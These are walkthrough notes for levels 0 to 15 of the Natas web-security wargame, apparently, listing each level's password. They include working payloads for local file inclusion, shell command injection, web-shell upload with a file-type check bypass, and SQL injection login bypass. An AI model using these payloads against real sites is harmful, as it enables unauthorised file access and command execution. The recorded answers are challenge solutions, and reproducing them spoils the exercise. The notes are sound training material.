level 0:
view-source
-> <!-- the pass is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
-> end

level 1:
->view-source with CTRL + U shortcut, because of the disabling of right
clicking
-> <!-- the pass is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

level 2:
view-source to view hidden <img> tag.
but the files has nothing to do with challenge.
we understand that we have a static files with name of files/
we open the files/ URL.
we show that there is a users.txt
and there is it. natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

level 3:
-> view-source
-> the keyword is "even google cannot find it." 
   so there must be robots.txt
-> we find there is a url with /s3cr3t
-> open users.txt
-> natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

level 4:
-> open burpsuite
-> enter username-password
-> refresh page
-> send the request to repeater
-> change the Referer header to natas5
-> Access granted. the pass is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

level 5:
-> change the loggedin cookie to 1 from 0.
-> the pass is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

level 6:
-> click view source code.
-> we show that there is a file named /includes/secret.inc
-> go that URL.
-> we show that the pass is 
	<?
		$secret = "FOEIUWGHFEEUHOFUOIU";
	?>
-> copy paste to input.
-> the pass is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9


level 7:
-> we see that there is a query with ?page param
-> we open the source code. there is a comment about
   next password is contained in /etc/natas_webpass/natas8
-> the keyword is local file inclusion.
-> send to ?page query with 
   ?page=../../../../../etc/natas_webpass/natas8
-> there it is DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

level 8:
-> encodedString can be decoded with these steps:
	1-) HEX to ASCII
	2-) Reverse the ASCII text.
	3-) Base64 decode the text.
	4-) then post to input
	5-) the next pass is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

level 9:
-> open the sourcecode
-> we see there is a calling sub proccess with grep -i $key
-> we put " ; " beginning of the value of $key to new command
-> it will be like "grep -i ; some bash command so on..."
-> my payload is ; cat /etc/natas_webpass/natas9 #
-> so the pass is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 

level 10:
-> payload is .* /etc/natas_webpass/natas11
-> there it is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

level 11:
-> examine the xor_encrypt() function
-> set cookie values to showpassword,yes, bgcolor, #ffffff
-> xor with xor'ed cookie and the array.
-> we will get the xor key ( from pattern ) "gw8J"
-> the next pass is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

level 12:
-> change the value of hidden input easy_shell.php
-> request with ?cmd param ?cmd=cat /etc/natas_webpass/natas13
-> rslt jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY cat /etc/natas_webpass/natas13


level 13:

-> change the value of hidden input easy_shell.php
-> there is a security check if it has jpeg magic number
   ( file description hexes) to bypass this you must add
   JPEG magic numbers. to do so, 
   echo -e "\xff\xd8\xff\xe0" > magic_jpeg_natas13
   concat the easyshell.php from previous backdoor with
   this file
   cat magic_jpeg_natas13 easyshell.php >> natas13_easy_shell.php
-> upload this
-> and request with ?cmd=cat /etc/natas_webpass/natas14
-> and the pass is Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1


level 14:

-> we see there is a debug option ( it's not must but can help)
-> we add the url ?debug param to see how query is done.
-> TL;DR we post password params with 
   username=natas14
   password=yubitsec" OR "1"="1
-> result is
   Executing query: SELECT * from users where username="natas14"
   and password="yubitsec" OR "1"="1"
   <br>Successful login! 
   The password for natas15 is 
   AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


level 15:
-> see the natas15.py
-> we can use like sql injection
-> if found website will response with exists.
-> first sql injection phase is if char is in the password.
-> then we build an alphabet.
-> we bruteforce again to alpha numeric characters in order to correct order.
-> finally
    The password for natas16 is 
    WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
